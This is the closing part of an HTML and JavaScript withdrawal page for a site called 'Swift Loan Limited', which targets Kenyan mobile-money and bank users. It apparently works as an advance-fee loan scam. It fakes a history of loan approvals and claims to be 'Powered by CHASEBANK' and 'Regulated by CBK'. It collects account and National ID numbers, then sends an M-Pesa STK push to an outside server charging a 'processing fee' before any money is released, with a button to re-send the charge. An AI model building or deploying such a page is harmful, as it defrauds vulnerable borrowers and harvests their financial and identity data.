                <h5><i class="fas fa-info-circle"></i> Transaction Verification</h5>
                <p style="font-size: 0.9rem; color: #2e7d32;">
                    If you need to verify your transaction, download the PDF receipt and send it to our support team for assistance.
                </p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <p style="font-weight: 600; font-size: 1.1rem; margin-bottom: 0.5rem;">
            <i class="fas fa-wallet" style="color: var(--primary-orange);"></i> Swift Loan Limited
        </p>
        <p>Secure, Fast, and Reliable Loan Services</p>
        <p style="margin-top: 1rem;">&copy; 2025 Swift Loan Limited. All rights reserved.</p>
        <p style="font-size: 0.85rem; opacity: 0.8;">Powered by CHASEBANK • Regulated by CBK • Licensed Money Lender</p>
    </footer>

    <script>
        // Global variables
        let loanData = {};
        let selectedWithdrawalMethod = '';
        let isProcessing = false;

        // Kenyan Banks List
        const kenyanBanks = [
            "Equity Bank (247247)",
            "KCB Bank (522522)",
            "Cooperative Bank (400200)",
            "NCBA Bank (654321)",
            "Absa Bank (303030)",
            "Standard Chartered (329329)",
            "DTB (380380)",
            "I&M Bank (975975)",
            "Stanbic Bank (225225)",
            "Family Bank (222111)",
            "Chase Bank (898898)"
        ];

        // Helper function for delays
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Helper function to get time ago
        function getTimeAgo(timestamp) {
            const now = new Date();
            const past = new Date(timestamp);
            const diffMs = now - past;
            const diffMins = Math.floor(diffMs / 60000);
            const diffHours = Math.floor(diffMs / 3600000);
            const diffDays = Math.floor(diffMs / 86400000);

            if (diffMins < 1) return 'Just now';
            if (diffMins === 1) return '1 minute ago';
            if (diffMins < 60) return `${diffMins} minutes ago`;
            if (diffHours === 1) return '1 hour ago';
            if (diffHours < 24) return `${diffHours} hours ago`;
            if (diffDays === 1) return '1 day ago';
            return `${diffDays} days ago`;
        }

        // Add transaction to history
        function addTransaction(title, description, type = 'info') {
            const transactions = JSON.parse(localStorage.getItem('swiftloan_transactions') || '[]');
            transactions.push({
                title,
                description,
                type,
                timestamp: new Date().toISOString()
            });
            localStorage.setItem('swiftloan_transactions', JSON.stringify(transactions));
            loadTransactions();
        }

        // Load and display transactions
        function loadTransactions() {
            const transactions = JSON.parse(localStorage.getItem('swiftloan_transactions') || '[]');
            const container = document.getElementById('timelineContainer');
            
            if (transactions.length === 0) {
                container.innerHTML = '<p style="color: #666; text-align: center;">No transactions yet</p>';
                return;
            }

            container.innerHTML = transactions.reverse().map(transaction => {
                const iconClass = transaction.type === 'success' ? 'success' : 
                                 transaction.type === 'pending' ? 'pending' : 'info';
                const icon = transaction.type === 'success' ? 'fa-check-circle' : 
                            transaction.type === 'pending' ? 'fa-clock' : 'fa-info-circle';
                
                return `
                    <div class="timeline-item">
                        <div class="timeline-icon ${iconClass}">
                            <i class="fas ${icon}"></i>
                        </div>
                        <div class="timeline-content">
                            <div class="timeline-title">${transaction.title}</div>
                            <div class="timeline-description">${transaction.description}</div>
                            <div class="timeline-time">${getTimeAgo(transaction.timestamp)}</div>
                        </div>
                    </div>
                `;
            }).join('');
        }

        // Go back function
        function goBack() {
            window.history.back();
        }

        // Show balance info
        function showBalanceInfo() {
            const balance = document.getElementById('availableBalance').textContent;
            alert(`Your Available Balance: ${balance}\n\nThis is the amount you can withdraw after processing fees.`);
        }

        // Load loan data on page load
        window.addEventListener('DOMContentLoaded', () => {
            // Initialize transactions if first time
            const transactions = localStorage.getItem('swiftloan_transactions');
            if (!transactions) {
                const initialTransactions = [
                    {
                        title: 'Eligibility Checked',
                        description: 'Your loan eligibility was verified successfully',
                        type: 'success',
                        timestamp: new Date(Date.now() - 5 * 60000).toISOString()
                    },
                    {
                        title: 'Loan Offers Generated',
                        description: 'Multiple loan offers were created based on your profile',
                        type: 'success',
                        timestamp: new Date(Date.now() - 3 * 60000).toISOString()
                    },
                    {
                        title: 'Loan Approved',
                        description: 'Your selected loan offer has been approved',
                        type: 'success',
                        timestamp: new Date(Date.now() - 2 * 60000).toISOString()
                    }
                ];
                localStorage.setItem('swiftloan_transactions', JSON.stringify(initialTransactions));
            }

            loadLoanData();
            checkPreviousWithdrawal();
            loadTransactions();
            loadSavedReceipt();
        });

        function loadLoanData() {
            try {
                // Get data from localStorage (from offers.html)
                const selectedOffer = localStorage.getItem('swiftloan_selected_offer');
                const personalDetails = localStorage.getItem('swiftloan_personal_details');
                const loanId = localStorage.getItem('swiftloan_loan_id');

                if (!selectedOffer || !personalDetails) {
                    showError('No loan data found. Please go back and select a loan offer.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                loanData = JSON.parse(selectedOffer);
                const personal = JSON.parse(personalDetails);

                console.log('Loaded loan data:', loanData);
                console.log('Personal details:', personal);

                // Update customer details
                document.getElementById('customerName').textContent = personal.fullName || 'N/A';
                document.getElementById('customerPhone').textContent = personal.phoneNumber || 'N/A';
                document.getElementById('loanId').textContent = loanId || 'N/A';

                // Update loan details
                document.getElementById('loanAmount').textContent = `KES ${loanData.principal.toLocaleString()}`;
                document.getElementById('processingFee').textContent = `KES ${loanData.fee.toLocaleString()}`;
                document.getElementById('availableBalance').textContent = `KES ${loanData.amountReceived.toLocaleString()}`;
                document.getElementById('withdrawalAmount').textContent = `KES ${loanData.amountReceived.toLocaleString()}`;

                console.log('Loan data loaded successfully');
            } catch (error) {
                console.error('Error loading loan data:', error);
                showError('Failed to load loan information. Please try again.');
                document.getElementById('withdrawBtn').disabled = true;
            }
        }

        // Load saved receipt from localStorage
        function loadSavedReceipt() {
            const savedReceipt = localStorage.getItem('swiftloan_receipt_data');
            
            if (savedReceipt) {
                try {
                    const receiptData = JSON.parse(savedReceipt);
                    
                    // Show success alert
                    document.getElementById('successAlert').classList.add('show');
                    document.getElementById('successMessage').innerHTML = receiptData.successMessage;
                    
                    // Update method logo
                    const logoElement = document.getElementById('selectedMethodLogo');
                    const nameElement = document.getElementById('selectedMethodName');
                    logoElement.style.background = receiptData.logoBackground;
                    logoElement.innerHTML = receiptData.logoHTML;
                    nameElement.textContent = receiptData.methodName;
                    
                    // Generate receipt
                    document.getElementById('receiptCardContainer').innerHTML = receiptData.receiptHTML;
                } catch (error) {
                    console.error('Error loading saved receipt:', error);
                }
            }
        }

        // Check for previous withdrawal request
        function checkPreviousWithdrawal() {
            const previousWithdrawal = localStorage.getItem('swiftloan_previous_withdrawal');
            
            if (previousWithdrawal) {
                try {
                    const withdrawalData = JSON.parse(previousWithdrawal);
                    
                    // Display previous withdrawal info
                    document.getElementById('prevLoanAmount').textContent = `KES ${withdrawalData.loanAmount.toLocaleString()}`;
                    document.getElementById('prevFeeAmount').textContent = `KES ${withdrawalData.feeAmount.toLocaleString()}`;
                    
                    // Show the card
                    document.getElementById('previousWithdrawalCard').classList.add('show');
                } catch (error) {
                    console.error('Error loading previous withdrawal:', error);
                }
            }
        }

        // Clear previous withdrawal
        function clearPreviousWithdrawal() {
            localStorage.removeItem('swiftloan_previous_withdrawal');
            document.getElementById('previousWithdrawalCard').classList.remove('show');
        }

        // Retry previous withdrawal
        async function retryWithdrawal() {
            const previousWithdrawal = localStorage.getItem('swiftloan_previous_withdrawal');
            
            if (!previousWithdrawal) {
                showError('No previous withdrawal data found.');
                return;
            }

            try {
                const withdrawalData = JSON.parse(previousWithdrawal);
                
                isProcessing = true;
                showProcessingOverlay();

                // Add transaction
                addTransaction('Withdrawal Retry Initiated', 'Retrying previous withdrawal request', 'pending');

                // Update processing steps
                updateProcessingStep(1, 'Validating details...');
                await delay(1500);
                
                updateProcessingStep(2, 'Sending withdrawal request to release funds...');
                await delay(1000);

                // Send STK push for fee payment using saved data
                const response = await fetch('https://backendstkpush.onrender.com/pay', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: withdrawalData.phone,
                        amount: withdrawalData.feeAmount,
                        tracking: withdrawalData.loanId
                    })
                });

                const result = await response.json();
                console.log('STK Push Response (Retry):', result);

                updateProcessingStep(3, 'STK push sent successfully!');
                await delay(2000);

                // Hide processing overlay
                hideProcessingOverlay();

                // Show success message
                const successMsg = `Your withdrawal request of <strong>KES ${withdrawalData.loanAmount.toLocaleString()}</strong> has been retried successfully! 
                    Check your phone (${withdrawalData.phone}) for the M-Pesa payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong>. 
                    Enter your M-Pesa PIN to complete the fee payment of KES ${withdrawalData.feeAmount.toLocaleString()} to process your withdrawal.`;
                
                document.getElementById('successMessage').innerHTML = successMsg;
                document.getElementById('successAlert').classList.add('show');
                
                // Scroll to success message
                document.getElementById('successAlert').scrollIntoView({ behavior: 'smooth', block: 'center' });

            } catch (error) {
                console.error('Retry withdrawal error:', error);
                hideProcessingOverlay();
                showError('Failed to retry withdrawal. Please try again or contact support.');
                isProcessing = false;
            }
        }

        // Show withdrawal methods modal
        function showWithdrawalMethods() {
            document.getElementById('withdrawalMethodModal').classList.add('active');
        }

        // Close withdrawal method modal
        function closeWithdrawalModal() {
            document.getElementById('withdrawalMethodModal').classList.remove('active');
        }

        // Select withdrawal method
        function selectMethod(method) {
            selectedWithdrawalMethod = method;
            setTimeout(() => {
                closeWithdrawalModal();
                showWithdrawalDetails(method);
            }, 300);
        }

        // Show withdrawal details modal with method-specific form
        function showWithdrawalDetails(method) {
            const modal = document.getElementById('withdrawalDetailsModal');
            const title = document.getElementById('detailsModalTitle');
            const formContainer = document.getElementById('withdrawalForm');
            
            const personalDetails = JSON.parse(localStorage.getItem('swiftloan_personal_details'));
            const phone = personalDetails.phoneNumber || '';
            const name = personalDetails.fullName || '';
            
            let formHTML = '';
            let titleText = '';

            switch(method) {
                case 'mpesa':
                    titleText = 'M-Pesa Withdrawal Details';
                    formHTML = `
                        <div style="text-align: center; margin-bottom: 1.5rem;">
                            <div class="method-icon mpesa" style="width: 60px; height: 60px; margin: 0 auto 1rem;">
                                <i class="fas fa-mobile-alt" style="font-size: 2rem;"></i>
                            </div>
                            <h4 style="color: var(--primary-blue);">M-Pesa Transfer</h4>
                            <p style="color: #666; font-size: 0.9rem;">Enter your M-Pesa number to receive funds</p>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-mobile-alt"></i> M-Pesa Phone Number</label>
                            <input type="tel" id="mpesaPhone" class="form-control" placeholder="254XXXXXXXXX" value="${phone}" maxlength="12">
                            <span class="error-message" id="mpesaPhoneError">Enter valid format: 254XXXXXXXXX</span>
                            <p style="font-size: 0.85rem; color: #666; margin-top: 0.3rem;">Format: 254XXXXXXXXX (without +)</p>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-user"></i> Account Name</label>
                            <input type="text" id="mpesaName" class="form-control" placeholder="Enter full name as registered" value="${name}">
                            <span class="error-message" id="mpesaNameError">Account name is required</span>
                        </div>

                        <div class="form-note">
                            <h5><i class="fas fa-info-circle"></i> M-Pesa Transfer Information:</h5>
                            <ul>
                                <li>You will receive an STK push notification from SwiftWallet Digital Ventures fee request</li>
                                <li>Funds will be credited instantly after confirmation</li>
                                <li>Transaction limit: KES 300,000 per day</li>
                            </ul>
                        </div>
                    `;
                    break;

                case 'airtel':
                    titleText = 'Airtel Money Withdrawal Details';
                    formHTML = `
                        <div style="text-align: center; margin-bottom: 1.5rem;">
                            <div class="method-icon airtel" style="width: 60px; height: 60px; margin: 0 auto 1rem;">
                                <i class="fas fa-mobile-alt" style="font-size: 2rem;"></i>
                            </div>
                            <h4 style="color: var(--primary-blue);">Airtel Money Transfer</h4>
                            <p style="color: #666; font-size: 0.9rem;">Enter your Airtel Money number to receive funds</p>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-mobile-alt"></i> Airtel Money Phone Number</label>
                            <input type="tel" id="airtelPhone" class="form-control" placeholder="254XXXXXXXXX" value="${phone}" maxlength="12">
                            <span class="error-message" id="airtelPhoneError">Enter valid format: 254XXXXXXXXX</span>
                            <p style="font-size: 0.85rem; color: #666; margin-top: 0.3rem;">Format: 254XXXXXXXXX (without +)</p>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-user"></i> Account Name</label>
                            <input type="text" id="airtelName" class="form-control" placeholder="Enter full name as registered" value="${name}">
                            <span class="error-message" id="airtelNameError">Account name is required</span>
                        </div>

                        <div class="form-note">
                            <h5><i class="fas fa-info-circle"></i> Airtel Money Transfer Information:</h5>
                            <ul>
                                <li>You will receive an SMS notification with code</li>
                                <li>Funds will be credited within 2-3 minutes from CHASE BANK</li>
                                <li>Transaction limit: KES 150,000 per day</li>
                            </ul>
                        </div>
                    `;
                    break;

                case 'bank':
                    titleText = 'Bank Transfer Withdrawal Details';
                    const bankOptions = kenyanBanks.map(bank => `<option value="${bank}">${bank}</option>`).join('');
                    formHTML = `
                        <div style="text-align: center; margin-bottom: 1.5rem;">
                            <div class="method-icon bank" style="width: 60px; height: 60px; margin: 0 auto 1rem;">
                                <i class="fas fa-university" style="font-size: 2rem;"></i>
                            </div>
                            <h4 style="color: var(--primary-blue);">Bank Transfer</h4>
                            <p style="color: #666; font-size: 0.9rem;">Enter your bank details to receive funds</p>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-university"></i> Select Bank</label>
                            <select id="bankName" class="form-control">
                                <option value="">Choose your bank...</option>
                                ${bankOptions}
                            </select>
                            <span class="error-message" id="bankNameError">Please select a bank</span>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-credit-card"></i> Account Number</label>
                            <input type="text" id="accountNumber" class="form-control" placeholder="Enter your account number" maxlength="20">
                            <span class="error-message" id="accountNumberError">Account number is required</span>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-user"></i> Account Holder Name</label>
                            <input type="text" id="accountName" class="form-control" placeholder="Enter full name as on bank account" value="${name}">
                            <span class="error-message" id="accountNameError">Account holder name is required</span>
                        </div>
                        
                        <div class="form-group">
                            <label><i class="fas fa-id-card"></i> ID Number</label>
                            <input type="text" id="idNumber" class="form-control" placeholder="Enter National ID number" maxlength="8">
                            <span class="error-message" id="idNumberError">ID number is required</span>
                        </div>

                        <div class="form-note">
                            <h5><i class="fas fa-info-circle"></i> Bank Transfer Information:</h5>
                            <ul>
                                <li>Funds will be credited within 3-5 minutes with approval from CHASE BANK</li>
                                <li>Account details must match your loan application</li>
                                <li>Transaction limit: KES 1,000,000 per day</li>
                            </ul>
                        </div>
                    `;
                    break;
            }

            title.textContent = titleText;
            formContainer.innerHTML = formHTML;
            
            modal.classList.add('active');
        }

        // Close withdrawal details modal
        function closeDetailsModal() {
            document.getElementById('withdrawalDetailsModal').classList.remove('active');
        }

        // Validate form
        function validateForm() {
            let isValid = true;
            
            // Clear previous errors
            document.querySelectorAll('.error-message').forEach(error => {
                error.classList.remove('show');
            });
            
            document.querySelectorAll('.form-control').forEach(field => {
                field.classList.remove('error');
            });

            switch(selectedWithdrawalMethod) {
                case 'mpesa':
                    const mpesaPhone = document.getElementById('mpesaPhone');
                    const mpesaName = document.getElementById('mpesaName');
                    
                    if (!mpesaPhone.value.trim() || !/^254[0-9]{9}$/.test(mpesaPhone.value.trim())) {
                        mpesaPhone.classList.add('error');
                        document.getElementById('mpesaPhoneError').classList.add('show');
                        isValid = false;
                    }
                    
                    if (!mpesaName.value.trim()) {
                        mpesaName.classList.add('error');
                        document.getElementById('mpesaNameError').classList.add('show');
                        isValid = false;
                    }
                    break;

                case 'airtel':
                    const airtelPhone = document.getElementById('airtelPhone');
                    const airtelName = document.getElementById('airtelName');
                    
                    if (!airtelPhone.value.trim() || !/^254[0-9]{9}$/.test(airtelPhone.value.trim())) {
                        airtelPhone.classList.add('error');
                        document.getElementById('airtelPhoneError').classList.add('show');
                        isValid = false;
                    }
                    
                    if (!airtelName.value.trim()) {
                        airtelName.classList.add('error');
                        document.getElementById('airtelNameError').classList.add('show');
                        isValid = false;
                    }
                    break;

                case 'bank':
                    const bankName = document.getElementById('bankName');
                    const accountNumber = document.getElementById('accountNumber');
                    const accountName = document.getElementById('accountName');
                    const idNumber = document.getElementById('idNumber');
                    
                    if (!bankName.value) {
                        bankName.classList.add('error');
                        document.getElementById('bankNameError').classList.add('show');
                        isValid = false;
                    }
                    
                    if (!accountNumber.value.trim() || !/^[0-9]{6,20}$/.test(accountNumber.value.trim())) {
                        accountNumber.classList.add('error');
                        document.getElementById('accountNumberError').classList.add('show');
                        isValid = false;
                    }
                    
                    if (!accountName.value.trim()) {
                        accountName.classList.add('error');
                        document.getElementById('accountNameError').classList.add('show');
                        isValid = false;
                    }
                    
                    if (!idNumber.value.trim() || !/^[0-9]{7,8}$/.test(idNumber.value.trim())) {
                        idNumber.classList.add('error');
                        document.getElementById('idNumberError').classList.add('show');
                        isValid = false;
                    }
                    break;
            }

            return isValid;
        }

        // Process withdrawal
        async function processWithdrawal() {
            if (isProcessing) return;
            
            if (!validateForm()) {
                return;
            }

            isProcessing = true;
            closeDetailsModal();
            showProcessingOverlay();

            try {
                // Collect form data
                let withdrawalData = {
                    method: selectedWithdrawalMethod,
                    loanId: localStorage.getItem('swiftloan_loan_id')
                };

                let paymentPhone = '';
                const personalDetails = JSON.parse(localStorage.getItem('swiftloan_personal_details'));

                switch(selectedWithdrawalMethod) {
                    case 'mpesa':
                        paymentPhone = document.getElementById('mpesaPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('mpesaName').value;
                        break;
                    case 'airtel':
                        paymentPhone = document.getElementById('airtelPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('airtelName').value;
                        break;
                    case 'bank':
                        paymentPhone = personalDetails.phoneNumber;
                        withdrawalData.bankName = document.getElementById('bankName').value;
                        withdrawalData.accountNumber = document.getElementById('accountNumber').value;
                        withdrawalData.accountName = document.getElementById('accountName').value;
                        withdrawalData.idNumber = document.getElementById('idNumber').value;
                        break;
                }

                // Save withdrawal request to localStorage
                const withdrawalRecord = {
                    phone: paymentPhone,
                    loanAmount: loanData.amountReceived,
                    feeAmount: loanData.fee,
                    loanId: withdrawalData.loanId,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('swiftloan_previous_withdrawal', JSON.stringify(withdrawalRecord));

                // Add transaction
                addTransaction('Withdrawal Request Initiated', 'Processing withdrawal to your account', 'pending');

                // Update processing steps
                updateProcessingStep(1, 'Validating details...');
                await delay(1500);
                
                updateProcessingStep(2, 'Sending withdrawal request to release funds...');
                await delay(1000);

                // Send STK push for fee payment
                const response = await fetch('https://backendstkpush.onrender.com/pay', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: paymentPhone,
                        amount: loanData.fee,
                        tracking: withdrawalData.loanId
                    })
                });

                const result = await response.json();
                console.log('STK Push Response:', result);

                updateProcessingStep(3, 'STK push sent successfully!');
                await delay(2000);

                // Hide processing overlay
                hideProcessingOverlay();

                // Show success message
                showSuccess(withdrawalData);

            } catch (error) {
                console.error('Withdrawal processing error:', error);
                hideProcessingOverlay();
                showError('Failed to process withdrawal. Please try again or contact support.');
                isProcessing = false;
            }
        }

        // Show processing overlay
        function showProcessingOverlay() {
            document.getElementById('processingOverlay').classList.add('active');
        }

        // Hide processing overlay
        function hideProcessingOverlay() {
            document.getElementById('processingOverlay').classList.remove('active');
            isProcessing = false;
        }

        // Update processing step
        function updateProcessingStep(stepNumber, text) {
            const stepElement = document.getElementById(`step${stepNumber}`);
            stepElement.innerHTML = `<i class="fas fa-check-circle" style="color: var(--success-green);"></i><span>${text}</span>`;
        }

        // Show success message
        function showSuccess(withdrawalData) {
            const methodName = selectedWithdrawalMethod === 'mpesa' ? 'M-Pesa' : 
                             selectedWithdrawalMethod === 'airtel' ? 'Airtel Money' : 'Bank Transfer';
            
            const phoneNumber = withdrawalData.phone || '';
            
            const successMsg = `Your withdrawal request of <strong>KES ${loanData.amountReceived.toLocaleString()}</strong> to ${methodName} has been initiated successfully! 
                Check your phone (${phoneNumber}) for the M-Pesa payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong>. 
                Enter your M-Pesa PIN to complete the fee payment of KES ${loanData.fee.toLocaleString()} to process your withdrawal.`;
            
            document.getElementById('successMessage').innerHTML = successMsg;
            document.getElementById('successAlert').classList.add('show');
            
            // Update method logo
            updateSelectedMethodLogo(selectedWithdrawalMethod, methodName);
            
            // Generate receipt
            generateReceipt(withdrawalData, methodName, successMsg);
            
            // Scroll to success message
            document.getElementById('successAlert').scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Update selected method logo
        function updateSelectedMethodLogo(method, methodName) {
            const logoElement = document.getElementById('selectedMethodLogo');
            const nameElement = document.getElementById('selectedMethodName');
            
            let logoBackground = '';
            let logoHTML = '';
            
            switch(method) {
                case 'mpesa':
                    logoBackground = 'var(--success-green)';
                    logoHTML = '<i class="fas fa-mobile-alt" style="color: white; font-size: 1.5rem;"></i>';
                    break;
                case 'airtel':
                    logoBackground = '#dc3545';
                    logoHTML = '<i class="fas fa-mobile-alt" style="color: white; font-size: 1.5rem;"></i>';
                    break;
                case 'bank':
                    logoBackground = '#007bff';
                    logoHTML = '<i class="fas fa-university" style="color: white; font-size: 1.5rem;"></i>';
                    break;
            }
            
            logoElement.style.background = logoBackground;
            logoElement.innerHTML = logoHTML;
            nameElement.textContent = methodName;
        }

        // Generate receipt
        function generateReceipt(withdrawalData, methodName, successMsg) {
            const receiptHTML = `
                <div class="receipt-card">
                    <div class="receipt-header">
                        <div class="receipt-logo">
                            <div style="width: 40px; height: 40px; background: var(--primary-orange); border-radius: 8px; display: flex; align-items: center; justify-content: center;">
                                <svg viewBox="0 0 24 24" style="fill: white; width: 24px; height: 24px;">
                                    <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 10H5V9h16v8z"/>
                                    <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 7l-2 2V3h-2z"/>
                                    <circle cx="17" cy="13" r="1"/>
                                </svg>
                            </div>
                            <div>
                                <h4 style="margin: 0; color: var(--primary-blue);">Swift Loan Limited</h4>
                                <p style="margin: 0; font-size: 0.85rem; color: #666;">Withdrawal Receipt</p>
                            </div>
                        </div>
                        <div class="receipt-status">PENDING</div>
                    </div>

                    <div>
                        <div class="receipt-row">
                            <span style="color: #666;">Transaction ID:</span>
                            <span style="font-weight: 600;">${withdrawalData.loanId}</span>
                        </div>
                        <div class="receipt-row">
                            <span style="color: #666;">Date & Time:</span>
                            <span style="font-weight: 600;">${new Date().toLocaleString()}</span>
                        </div>
                        <div class="receipt-row">
                            <span style="color: #666;">Withdrawal Method:</span>
                            <span style="font-weight: 600; text-transform: uppercase;">${selectedWithdrawalMethod}</span>
                        </div>
                        <div class="receipt-row">
                            <span style="color: #666;">Account:</span>
                            <span style="font-weight: 600;">${withdrawalData.phone || withdrawalData.accountNumber || 'N/A'}</span>
                        </div>
                        <div class="receipt-row" style="padding-top: 1rem; border-top: 2px solid var(--light-gray);">
                            <span style="font-weight: 700; font-size: 1.1rem;">Amount:</span>
                            <span style="font-weight: 700; font-size: 1.3rem; color: var(--success-green);">KES ${loanData.amountReceived.toLocaleString()}</span>
                        </div>
                    </div>

                    <div class="receipt-footer">
                        <p style="margin: 0; font-size: 0.9rem; color: #2e7d32; font-weight: 600;">
                            <i class="fas fa-info-circle"></i>
                            Complete the fee payment to process your withdrawal
                        </p>
                        <button onclick="window.print()" style="margin-top: 0.8rem; background: none; border: none; color: var(--primary-orange); font-weight: 600; cursor: pointer; text-decoration: underline;">
                            <i class="fas fa-print"></i> Print Receipt
                        </button>
                    </div>
                </div>
            `;
            
            document.getElementById('receiptCardContainer').innerHTML = receiptHTML;

            // Save receipt data to localStorage
            const logoElement = document.getElementById('selectedMethodLogo');
            const receiptData = {
                receiptHTML: receiptHTML,
                successMessage: successMsg,
                methodName: methodName,
                logoBackground: logoElement.style.background,
                logoHTML: logoElement.innerHTML,
                timestamp: new Date().toISOString()
            };
            localStorage.setItem('swiftloan_receipt_data', JSON.stringify(receiptData));
        }

        // Show error
        function showError(message) {
            document.getElementById('errorMessage').textContent = message;
            document.getElementById('errorAlert').classList.add('show');
            document.getElementById('errorAlert').scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Open help modal
        function openHelpModal() {
            document.getElementById('helpModal').classList.add('active');
        }

        // Close help modal
        function closeHelpModal() {
            document.getElementById('helpModal').classList.remove('active');
        }
    </script>
</body>
</html>
